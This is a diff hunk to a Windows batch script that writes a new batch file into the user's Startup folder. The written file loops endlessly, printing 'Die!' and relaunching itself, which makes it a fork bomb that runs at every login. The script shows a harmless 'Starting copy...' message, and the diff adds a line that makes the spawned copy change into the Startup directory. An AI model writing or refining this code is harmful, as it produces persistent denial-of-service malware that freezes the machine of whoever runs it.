@@ -18,6 +18,7 @@ echo Starting copy...
 cd "%AppData%/Microsoft/Windows/Start Menu/Programs/Startup"
 (
 echo :funny
+echo cd "%AppData%/Microsoft/Windows/Start Menu/Programs/Startup"
 echo echo Die!
 echo start funny.bat
 echo goto:funny
